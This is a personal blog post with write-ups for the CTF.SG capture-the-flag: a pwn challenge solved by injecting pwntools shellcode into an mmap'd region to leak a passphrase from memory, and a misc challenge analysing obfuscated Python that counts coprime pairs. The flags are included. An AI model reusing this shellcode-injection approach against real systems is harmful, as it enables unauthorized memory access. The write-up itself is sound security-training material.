I"F1<p>1 week, 1 CTF, 3 weeks straight. These CTFs just keep coming, don’t they?</p>

<p>Interestingly the three CTFs were also arranged in order of increasing perceived difficulty, which was nice but also terrible at the same time because I had some trouble pulling my weight in this particular CTF in terms of points.</p>

<p>The CTF.SG CTF is the first open CTF event hosted by the CTF.SG team in Singapore, and was DEFINITELY not catered towards JC students. :P</p>

<p>Nevertheless, (not) my (usual) team managed to achieve a respectable 2nd place in this CTF!</p>

<p><img src="/assets/Images/CTF-SG/scoreboard.png" alt="" /></p>

<h1 id="writeups">Writeups</h1>
<p>Below are some of my writeups for this CTF:</p>
<ol>
  <li><a href="#XMM">(Pwn) XMM</a></li>
  <li><a href="#fourpass">(Misc) Fourpass</a></li>
</ol>

<h2 id="xmm">XMM</h2>

<p><code class="language-plaintext highlighter-rouge">Help Kenneth get the xmm!</code></p>

<h3 id="disclaimer">Disclaimer</h3>
<p>This challenge was done after the CTF because <a href="https://ariana1729.github.io/">ariana</a> too fast.</p>

<h3 id="reconnaissance">Reconnaissance</h3>
<p>We are greeted by a binary with the following checksecs:</p>

<p><img src="/assets/Images/CTF-SG/pwn-xmm/checksec.png" alt="" /></p>

<p>,does the following:</p>

<p><img src="/assets/Images/CTF-SG/pwn-xmm/xmm_main.png" alt="" /></p>

<p>and has two interesting functions:</p>

<p><img src="/assets/Images/CTF-SG/pwn-xmm/xmm_answer.png" alt="" /></p>

<p><em>This one checks for some kind of constant passphrase, which is stored here:</em></p>

<p><img src="/assets/Images/CTF-SG/pwn-xmm/xmm_favorite.png" alt="" /></p>

<p>So the challenge seems pretty straightforward which was probably why it was blitzed.</p>

<h3 id="vulnerability-analysis">Vulnerability analysis</h3>
<ul>
  <li>Passphrase is evidently not randomised.
    <ul>
      <li>Opens up the possibility of a leak.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">mmap64()</code> basically gives us a huge area with which to write <strong>arbitrary</strong> shellcode.
    <ul>
      <li>We can leak passphrase with some (hopefully not painful) shellcoding.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">answer()</code> prints flag.
    <ul>
      <li>So we’re going there.</li>
    </ul>
  </li>
</ul>

<h3 id="script">Script</h3>
<p>There is honestly not much else to say. This challenge is pretty straightforward and I can probably only fault myself for not having opened it at all.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'DEBUG'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals.ctf.sg'</span><span class="p">,</span> <span class="mi">20401</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"┃ ┃             "</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"newfonewhodis"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x49501d</span><span class="p">,</span><span class="mi">13</span><span class="p">)))</span>
<span class="n">string</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">recvall</span><span class="p">()[:</span><span class="o">-</span><span class="mi">13</span><span class="p">]</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals.ctf.sg'</span><span class="p">,</span> <span class="mi">20401</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"┃ ┃             "</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
</code></pre></div></div>

<p>And thus we receive the flag:</p>

<p><code class="language-plaintext highlighter-rouge">CTFSG{xmm_hunter_1337}</code></p>

<p>… What a creepy challenge.</p>

<h2 id="fourpass">Fourpass</h2>
<p><code class="language-plaintext highlighter-rouge">This is my response to a certain telco’s OnePass. I call it “Fourpass” (because it takes *four* inputs instead of *one*). I don’t think it’ll get accepted because it is so slow though...</code></p>

<h3 id="reconnaissance-1">Reconnaissance</h3>

<p>We are given what appears to be a <code class="language-plaintext highlighter-rouge">token</code>, which I surmised to be some kind of binary. Until…</p>

<p><img src="/assets/Images/CTF-SG/misc-token/tokenfile.png" alt="" /></p>

<p>… That was pretty dumb.</p>

<p>Now that we’ve ascertained that the file is just Python code, we will simply beautify and rewrite said code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3.8
</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">input</span><span class="p">().</span><span class="n">split</span><span class="p">()))</span>

<span class="n">gcd</span><span class="o">=</span><span class="k">lambda</span> <span class="n">f</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span> <span class="n">x</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">y</span> <span class="k">else</span> <span class="n">f</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="o">%</span><span class="n">y</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span>
    <span class="nb">sum</span><span class="p">(</span> <span class="c1"># Sums them up???
</span>        <span class="nb">filter</span><span class="p">(</span>
            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="p">,</span> 
            <span class="c1"># Finds all values within here that are 1.
</span>            <span class="nb">map</span><span class="p">(</span> 
                <span class="c1"># x below is val_1 and val_2 as a tuple.
</span>                <span class="k">lambda</span> <span class="n">x</span><span class="p">:(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">:(</span><span class="k">lambda</span> <span class="n">z</span><span class="p">:</span><span class="n">z</span><span class="p">(</span><span class="n">z</span><span class="p">))(</span><span class="k">lambda</span> <span class="n">z</span><span class="p">:</span><span class="n">f</span><span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">y</span><span class="p">:</span> <span class="n">z</span><span class="p">(</span><span class="n">z</span><span class="p">)(</span><span class="o">*</span><span class="n">y</span><span class="p">))))</span> 
                <span class="c1"># z(z) is recursion.
</span>                    <span class="p">(</span><span class="n">gcd</span><span class="p">)(</span><span class="o">*</span><span class="n">x</span><span class="p">),</span> 
                    <span class="c1"># Again, val_1,val_2 (something)(gcd(f,x))
</span>                    <span class="p">[(</span><span class="n">val_1</span><span class="p">,</span> <span class="n">val_2</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_1</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">)]</span> 
                    <span class="c1"># All possible tuples of f and x.
</span>            <span class="p">)</span>
        <span class="p">)</span>
        <span class="p">)</span>
<span class="p">)</span><span class="c1"># So what's happening in this algo is that we count the number of coprime tuples in a&lt;=val_1&lt;b,c&lt;=val_2&lt;d
</span></code></pre></div></div>

<p>And thus we make the following deductions:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">gcd</code> is well… gcd. (Extracted from that ugly thing in the middle.)</li>
  <li>Iterating through some set of tuples, we are retrieving the gcd… and?</li>
  <li><code class="language-plaintext highlighter-rouge">lambda z: z(z)</code> must be recursion. Unexpected <a href="https://allthingslinguistic.com/post/95678520747/the-lambda-calculus-for-absolute-dummies-like">linguistics</a>.</li>
  <li>As I have already annotated above, the program counts the number of coprime tuples in <code class="language-plaintext highlighter-rouge">a&lt;=val_1&lt;b,c&lt;=val_2&lt;d</code>.
    <ul>
      <li>This is not difficult to see as we can rewrite the whole function inside the <code class="language-plaintext highlighter-rouge">map()</code> as:
        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">print</span><span class="p">(</span><span class="nb">sum</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="p">,</span><span class="nb">map</span><span class="p">(</span><span class="n">gcd</span><span class="p">,[(</span><span class="n">val_1</span><span class="p">,</span> <span class="n">val_2</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_1</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">)]))))</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<p>However, this is not the main challenge, sadly for me.</p>

<h3 id="the-real-challenge-nc-chalsctfsg-15201">The Real Challenge: nc chals.ctf.sg 15201</h3>

<p>Where I <strong>REALLY</strong> got stuck was this part, where you receive <code class="language-plaintext highlighter-rouge">enormous numbers</code> and this happens:</p>

<p>The existing program was too inefficient to actually do its job in this particular context.</p>

<p>Naturally, seeing a pattern, I was inclined to think of it as a problem involving <code class="language-plaintext highlighter-rouge">Euler's Totient Function</code>.
But <a href="https://ariana1729.github.io/">ariana</a> finished up with his challenge and shifted his attention to this particular challenge.
That was very good for me since I can’t function at night.</p>

<p>See his writeup <a href="https://ariana1729.github.io/writeups/CTFSG/FourPass/2021-03-14-FourPass.html">here</a>.</p>

<p>… And then I woke up to the flag!</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">CTFSG{c_4_c0pR1me_Int3geRs}</code></p>
:ET